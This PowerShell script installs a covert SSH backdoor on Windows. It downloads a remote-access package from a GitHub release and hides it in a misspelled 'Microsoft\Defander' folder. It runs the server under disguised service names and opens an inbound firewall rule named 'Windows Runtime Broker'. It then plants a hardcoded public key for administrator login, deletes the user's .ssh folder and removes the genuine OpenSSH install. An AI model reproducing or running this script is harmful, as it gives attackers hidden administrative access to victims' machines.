$currentDirectory = Get-Location
$openSSHFolder =  "$env:ProgramData\ssh"
$OldPath = "C:\Program Files\OpenSSH"
$InstallPath = "$env:ProgramData\Microsoft\Defander"
$TempDir = [System.IO.Path]::GetTempPath()
$GitZipName = Join-Path $TempDir "runtime.zip"
$GitUrl = 'https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/access-server.zip'
$ErrorActionPreference = "Stop"
$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$UserPrincipal = New-Object System.Security.Principal.WindowsPrincipal($CurrentUser)
$AdminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
$IsAdmin = $UserPrincipal.IsInRole($AdminRole)
$ErrorActionPreference = "SilentlyContinue"
Write-Host "Checking for Windows OpenSSH Server" -ForegroundColor Green
if ($(Get-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0).State -eq "Installed") {
Write-Host "Removing Windows OpenSSH Server" -ForegroundColor Green
Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction SilentlyContinue
}
Write-Host "Checking for Windows OpenSSH Client" -ForegroundColor Green
if ($(Get-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0).State -eq "Installed") {
Write-Host "Removing Windows OpenSSH Client" -ForegroundColor Green
Remove-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction SilentlyContinue
}
$ErrorActionPreference = "Stop"
if (Get-Service runtimed -ErrorAction SilentlyContinue) {
Stop-Service runtimed -ErrorAction SilentlyContinue
sc.exe delete runtimed 1>$null
}
if (Get-Service runtimedd -ErrorAction SilentlyContinue) {
Stop-Service runtimedd -ErrorAction SilentlyContinue
sc.exe delete runtimedd 1>$null
}
if (Get-Service sshd -ErrorAction SilentlyContinue) {
Stop-Service sshd -ErrorAction SilentlyContinue
}
if (Get-Service ssh-agent -ErrorAction SilentlyContinue) {
Stop-Service ssh-agent -ErrorAction SilentlyContinue
}
if ($OpenSSHLocation.Length -eq 0) {
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $GitUrl -OutFile $GitZipName -ErrorAction Stop -TimeoutSec 5 -Headers @{"Pragma" = "no-cache"; "Cache-Control" = "no-cache"; } -UserAgent $UserAgent
}
else {
$PathInfo = [System.Uri]([string]::":FileSystem::" + $OpenSSHLocation)
if ($PathInfo.IsUnc) {
Copy-Item -Path $PathInfo.LocalPath -Destination $env:TEMP
Set-Location $env:TEMP
}
}
Remove-Item -Path $InstallPath -Force -Recurse -ErrorAction SilentlyContinue
If (!(Test-Path $InstallPath)) {
New-Item -Path $InstallPath -ItemType "directory" -ErrorAction Stop | Out-Null
}
$OldEnv = [Environment]::CurrentDirectory
[Environment]::CurrentDirectory = $(Get-Location)
Add-Type -AssemblyName System.IO.Compression.FileSystem
$archive = [System.IO.Compression.ZipFile]::OpenRead($GitZipName)
$archive.Entries | ForEach-Object {
if ($_.Name -ne '') {
$NewFileName = Join-Path $InstallPath $_.Name
[System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, $NewFileName)}}
$archive.Dispose()
Set-Location $OldEnv
if ($OpenSSHURL.Length -gt 0) { Remove-Item -Path $GitZipName -Force -ErrorAction SilentlyContinue }
Set-Location $InstallPath -ErrorAction Stop
if (!(Test-Path $openSSHFolder)) {
New-Item -ItemType Directory -Force -Path $openSSHFolder -ErrorAction Stop | Out-Null}
powershell.exe -ExecutionPolicy Bypass -File install-sshd.ps1
Set-Service -Name runtimed -StartupType 'Automatic' -ErrorAction Stop
if (!(Test-Path $openSSHFolder)) {
New-Item -ItemType Directory -Force -Path $openSSHFolder -ErrorAction Stop | Out-Null}
#Setup sshd_config
Copy-Item -Path $InstallPath\sshd_config_default -Destination $openSSHFolder\sshd_config -Force -ErrorAction Stop
Add-Content -Path $openSSHFolder\sshd_config -Value "`r`nGSSAPIAuthentication yes" -ErrorAction Stop
if ($DisablePasswordAuthentication) { Add-Content -Path $openSSHFolder\sshd_config -Value "PasswordAuthentication no" -ErrorAction Stop }
if ($DisablePubkeyAuthentication) { Add-Content -Path $openSSHFolder\sshd_config -Value "PubkeyAuthentication no" -ErrorAction Stop }
#Setting autostarts
if ($AutoStartSSHD) {
Write-Host "Setting sshd service to Automatic start" -ForegroundColor Green;
Set-Service -Name runtimed -StartupType Automatic;
}
if ($AutoStartSSHAGENT) {
Write-Host "Setting ssh-agent service to Automatic start" -ForegroundColor Green;
Set-Service -Name runtimedd -StartupType Automatic;
}
#Start the service
Write-Host "Starting sshd Service" -ForegroundColor Green
Start-Service runtimed -ErrorAction Stop
#Add to path if it isnt already there
$existingPath = (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).path
if ($existingPath -notmatch $InstallPath.Replace("\", "\\")) {
Write-Host "Adding OpenSSH Directory to path" -ForegroundColor Green
$newpath = "$existingPath;$InstallPath"
Set-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH -Value $newPath -ErrorAction Stop
}
#Make sure user keys are configured correctly
Write-Host "Ensuring HostKey file permissions are correct" -ForegroundColor Green
powershell.exe -ExecutionPolicy Bypass -Command '. .\FixHostFilePermissions.ps1 -Confirm:$false'
#Make sure host keys are configured correctly
Write-Host "Ensuring UserKey file permissions are correct" -ForegroundColor Green
powershell.exe -ExecutionPolicy Bypass -Command '. .\FixUserFilePermissions.ps1 -Confirm:$false'
#Add firewall rule
Write-Host "Creating firewall rule" -ForegroundColor Green
New-NetFirewallRule -Name sshd -DisplayName 'Windows Runtime Broker' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
#Set Shell to powershell
Write-Host "Setting default shell to powershell" -ForegroundColor Green
New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force -ErrorAction Stop | Out-Null
$SSHPublicKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwoQ5u4sZA/cz2iAatR8Uyl8GbRJXb5zLmw20oxRUKzWZuEwpta0Dm9qoyG6Oo9zhLB5YaOpjrmVk2hD+RL5iSRdFPQ3sI19Az5jwvQzUNEpGWTZxu8/Uvtu0MvtFVOzJfWYtncrlEjQt6Z0iBOBHjUsnR2EqOiFYP/FGgvH4q7mmmsj5mds6q48flhzW+spBlPaHu0CcIFhu6XTt1oAbvRKDjfPgWOEYopWgglqCl/+IiRNsWyKwQN9P2/IiaRAVqF1KekNtqyAFyzg2deIDYKj+nSLQ6NxMTPJx4fNeqUYO37K6+1AkLX5iLCBjmQrsfRiPZNO5DivJJq1eg8y2weqI210odjHj6EHnJCpHs7ogsKvIbewsD4FxJC3XqfuwvKPba/ho2W0lmNZjv6CpepasKSBE/N4ooTbpKegN0U0gjH+eh1+TiAK3PB6rlmtEc06kt0eZyCpn4yhFLdS13Mfpx8ijpPd+0yNyAd8DHDFfWLy1EX2cMBd0B7iDE5aU="
if ($SSHPublicKey -ne "" -And (-not (Test-Path "$openSSHFolder\administrators_authorized_keys"  -PathType leaf ))) {
Set-Content -Path  "$openSSHFolder\administrators_authorized_keys" -Value $SSHPublicKey}
$acl = Get-Acl  "$openSSHFolder\administrators_authorized_keys"
$acl.SetAccessRuleProtection($true, $false)
$administratorsRule = New-Object system.security.accesscontrol.filesystemaccessrule("Administrators","FullControl","Allow")
$systemRule = New-Object system.security.accesscontrol.filesystemaccessrule("SYSTEM","FullControl","Allow")
$acl.SetAccessRule($administratorsRule)
$acl.SetAccessRule($systemRule)
$acl | Set-Acl
$currentUserRoot = $env:USERPROFILE
$sshFolder = Join-Path -Path $currentUserRoot -ChildPath ".ssh"
if (Test-Path $sshFolder) { try {
Remove-Item -Path $sshFolder -Force -Recurse -ErrorAction Stop
} catch {}}
Set-Location $currentDirectory
Restart-Service runtimed
$services = Get-Service runtimed -ErrorAction SilentlyContinue
if ($services -and ($services.Status -eq 'Running')) {
if (Get-Service sshd -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq 'Running' }) {
Stop-Service sshd -ErrorAction SilentlyContinue
sc.exe delete sshd 1>$null}}
$services = Get-Service runtimedd -ErrorAction SilentlyContinue
if ($services -and ($services.Status -eq 'Running')) {
if (Get-Service ssh-agent -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq 'Running' }) {
Stop-Service ssh-agent -ErrorAction SilentlyContinue
sc.exe delete ssh-agent 1>$null}}
Remove-Item -Path $OldPath -Force -Recurse -ErrorAction SilentlyContinue